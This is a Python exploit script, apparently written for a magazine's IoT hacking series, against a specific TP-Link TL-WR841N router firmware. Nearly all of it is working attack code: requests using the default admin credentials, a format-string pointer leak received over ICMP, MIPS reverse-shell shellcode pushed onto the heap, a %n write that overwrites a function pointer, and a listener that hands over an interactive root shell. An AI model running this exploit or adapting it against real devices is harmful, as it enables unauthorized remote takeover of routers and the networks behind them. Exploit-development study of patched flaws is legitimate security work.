#!/usr/bin/env python3

import struct, socket, sys, telnetlib
from scapy.all import AsyncSniffer
from time import sleep

# While NSIDE analyzed CVE-2017-8220 for an IoT hacking series article, a format-string vulnerability was observed in the already present exploit chain.
# NSIDE created an exploit script that does not abuse the trivial OS Command injection that was already present, but leverages the format-string to a root shell.
# The purpose of this excercise was to develop a step by step guide for exploit development in NSIDEs IoT hacking series in the iX magazine.
# The exploit works on firmware version TL-WR841Nv14_EU_0.9.1_4.16 and was patched in TL-WR841Nv14_EU_0.9.1_4.17.
#
# The exploit requires root access, as an infoleak is received via ICMP. Scapy requires root for this purpose
# The exploit has the credentials admin/admin hardcoded as Base64 header. These are the default credentials of the device.

def interactive(sock, production = True):
	t = telnetlib.Telnet()
	t.sock = sock
	t.interact()
def addr(x):
    return struct.pack('<I', x)
def number(x):
    return struct.unpack('>I', x)[0]
	
if(len(sys.argv) < 5) :
    print('[-] Usage: sudo pwn.py hostname port infoleak rev_ip rev_port [interface]\nThe interface parameter is optional, but sometimes required, if scapy cannot receive ICMP requests in the default launch operation\nCurrently the exploit uses the hardcoded credentials admin:admin')
    sys.exit(-1)
def leakinfo(host,port,rev_ip,interface):

    # Request that leaks pointer to the attacker via ICMP
    request = b'POST /cgi?2 HTTP/1.1\r\n'
    request += b'Host: ' + host.encode('utf-8') + b'\r\n'
    request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\r\n'
    request += b'Accept: */*\r\n'
    request += b'Accept-Language: en-US,en;q=0.5\r\n'
    request += b'Accept-Encoding: gzip, deflate\r\n'
    request += b'Content-Type: text/plain\r\n'
    request += b'Content-Length: 180\r\n'
    request += b'Origin: http://' + host.encode('utf-8') + b'\r\n'
    request += b'Connection: close\r\n'
    request += b'Referer: http://' + host.encode('utf-8') + b'/mainFrame.htm\r\n'
    request += b'Cookie: Authorization=Basic YWRtaW46YWRtaW4=\r\n\r\n'
    request += b'[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n'
    request += b'dataBlockSize=64\r\n'
    request += b'timeout=1\r\n'
    request += b'numberOfRepetitions=1\r\n'
    request += b'host=' + rev_ip.encode('utf-8') + b' -p %x1%x%x\r\n'
    request += b'X_TP_ConnName=ewan_ipoe_s\r\n'
    request += b'diagnosticsState=Requested\r\n'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)

    try :
       s.connect((host, port))
    except :
        print('[-] Unable to connect')
        sys.exit(-1)
    print('[+] Connected to remote host\n[*] Injecting Infoleak ping command\n')

    s.send(request)
    sleep(0.5)
    s.recv(2072)
    s.close()

    print('[*] Starting ICMP listener to receive leak\n')
    if 'null' in interface:
        sniffer = AsyncSniffer(filter='icmp and host ' + rev_ip, count=1)

    else:
        sniffer = AsyncSniffer(iface=interface, filter='icmp and host ' + rev_ip, count=1)
    sniffer.start()
    sleep(2)

    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.settimeout(2)
    
    print('[*] Connecting to evaluate format string and transmit infoleak via ICMP request')
    try :
        s2.connect((host, port))
    except :
        print('[-] Unable to connect')
        sys.exit(-1)


    # Request that executes the ping
    request = b'POST /cgi?7 HTTP/1.1\r\n'
    request += b'Host: ' + host.encode('utf-8') + b'\r\n'
    request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\r\n'
    request += b'Accept: */*\r\n'
    request += b'Accept-Language: en-US,en;q=0.5\r\n'
    request += b'Accept-Encoding: gzip, deflate\r\n'
    request += b'Content-Type: text/plain\r\n'
    request += b'Content-Length: 44\r\n'
    request += b'Origin: http://' + host.encode('utf-8') + b'\r\n'
    request += b'Connection: close\r\n'
    request += b'Referer: http://' + host.encode('utf-8') + b'/mainFrame.htm\r\n'
    request += b'Cookie: Authorization=Basic YWRtaW46YWRtaW4=\r\n\r\n'
    request += b'[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n'

    print('[*] Executing ping\n')
    s2.send(request)

    sniffer.join()
    leak = sniffer.results
    address = number(leak[0].lastlayer().load[9:13])
    print('[+] Got ICMP Request; Infoleak: {}\n'.format(hex(address)))
    return address


def insert_shellcode(host,port,rev_ip,rev_port):

    ip = rev_ip.split('.')
    a = bytes([int(ip[0])])
    b = bytes([int(ip[1])])
    c = bytes([int(ip[2])])
    d = bytes([int(ip[3])])
    rev_port = struct.pack('>H', rev_port)

    buf = b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
    buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
    buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
    buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf" + rev_port + b"\x0e\x3c"
    buf += rev_port + b"\xce\x35\xe4\xff\xae\xaf" + c + d + b"\x0e\x3c" + a
    buf += b + b"\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
    buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
    buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
    buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
    buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
    buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
    buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
    buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
    buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
    buf += b"\x01\x01"
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
       
    try :
       s.connect((host, port))
    except :
        print('[-] Unable to connect')
        sys.exit(-1)

    print('[+] Connected to remote host\n[*] Pushing shellcode to heap')


    # Request that places shellcode on the heap
    request = b'POST /cgi?1&1&1&8 HTTP/1.1\r\n'
    request += b'Host: ' + host.encode('utf-8') + b'\r\n'
    request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\r\n'
    request += b'Accept: */*\r\n'
    request += b'Accept-Language: en-US,en;q=0.5\r\n'
    request += b'Accept-Encoding: gzip, deflate\r\n'
    request += b'Content-Type: text/plain\r\n'
    request += b'Content-Length: 4237\r\n'
    request += b'Origin: http://' + host.encode('utf-8') + b'\r\n'
    request += b'Cookie: Authorization=Basic YQo=\r\n'
    request += b'Connection: close\r\n\r\n'
    request += b'[IGD_DEV_INFO#0,0,0,0,0,0#0,0,0,0,0,0]0,4\r\n'
    request += b'modelName\r\n'
    request += b'A' * 1108 + buf + b'A' * 2500 + b'\r\n'
    request += b'X_TP_isFD\r\n'
    request += b'X_TP_ProductVersion\r\n'
    request += b'[ETH_SWITCH#0,0,0,0,0,0#0,0,0,0,0,0]1,1\r\n'
    request += b'numberOfVirtualPorts\r\n'
    request += b'[MULTIMODE#0,0,0,0,0,0#0,0,0,0,0,0]2,1\r\n'
    request += b'mode\r\n'
    request += b'[/cgi/info#0,0,0,0,0,0#0,0,0,0,0,0]3,0\r\n'
    
    s.send(request)
    sleep(0.5)
    s.recv(2072)
    s.close()


host = sys.argv[1]
port = int(sys.argv[2])
rev_port = int(sys.argv[4])
interface = 'null'
if len(sys.argv) > 5:
    interface = sys.argv[5]

infoleak = leakinfo(host,port,sys.argv[3],interface)
insert_shellcode(host,port,sys.argv[3],rev_port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.settimeout(2)
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.settimeout(2)

print('\n[*] Starting listener on 0.0.0.0:' + str(rev_port) + '\n')
s1.bind(("0.0.0.0", rev_port))
s1.listen(2)

print('[*] Waiting for two seconds for the server to complete the old ping')
sleep(2)
print('[*] Connecting for format string injection')
try :
	s.connect((host, port))
except :
	print('[-] Unable to connect')
	sys.exit(-1)

target = infoleak + 0x1afba
print('[*] Sending format string to overwrite &cdbg_printf @ {}\n'.format(hex(target)))

# Request that overwrites the function pointer of cdbg_printf
request = b'POST /cgi?2 HTTP/1.1\r\n'
request += b'Host: ' + host.encode('utf-8') + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\r\n'
request += b'Accept: */*\r\n'
request += b'Accept-Language: en-US,en;q=0.5\r\n'
request += b'Accept-Encoding: gzip, deflate\r\n'
request += b'Content-Type: text/plain\r\n'
request += b'Content-Length: 208\r\n'
request += b'Origin: http://' + host.encode('utf-8') + b'\r\n'
request += b'Connection: close\r\n'
request += b'Referer: http://' + host.encode('utf-8') + b'/mainFrame.htm\r\n'
request += b'Cookie: Authorization=Basic YWRtaW46YWRtaW4=\r\n\r\n'
request += b'[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n'
request += b'dataBlockSize=64\r\n'
request += b'timeout=1\r\n'
request += b'numberOfRepetitions=1\r\n'
request += b'host=X' + addr(target) + b'%x' * 18 + b'%4341646x%n\r\n'
request += b'X_TP_ConnName=ewan_ipoe_s\r\n'
request += b'diagnosticsState=Requested\r\n'
s.send(request)

s.recv(1024)
s.close()

print('[*] Connecting to evaluate format string and jump to shellcode')
try :
        s2.connect((host, port))
except :
        print('[-] Unable to connect')
        sys.exit(-1)

print('[*] Executing ping')

# Request that executes the ping
request = b'POST /cgi?7 HTTP/1.1\r\n'
request += b'Host: ' + host.encode('utf-8') + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\r\n'
request += b'Accept: */*\r\n'
request += b'Accept-Language: en-US,en;q=0.5\r\n'
request += b'Accept-Encoding: gzip, deflate\r\n'
request += b'Content-Type: text/plain\r\n'
request += b'Content-Length: 44\r\n'
request += b'Origin: http://' + host.encode('utf-8') + b'\r\n'
request += b'Connection: close\r\n'
request += b'Referer: http://' + host.encode('utf-8') + b'/mainFrame.htm\r\n'
request += b'Cookie: Authorization=Basic YWRtaW46YWRtaW4=\r\n\r\n'
request += b'[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n'

s2.send(request)
print('[*] Awaiting connection')


try:
    (client, (ip, port)) = s1.accept()
except:
    print('\n[-] Something went wrong\n[-] Common culprits:\n[-] - The hexadecimal representation of your IP or PORT does contain \\r or \\n\n')
    exit()
print('[+] Incoming connection from: ' + ip + ':' + str(port) + '\n')

s2.close()
interactive(client)
s1.close()
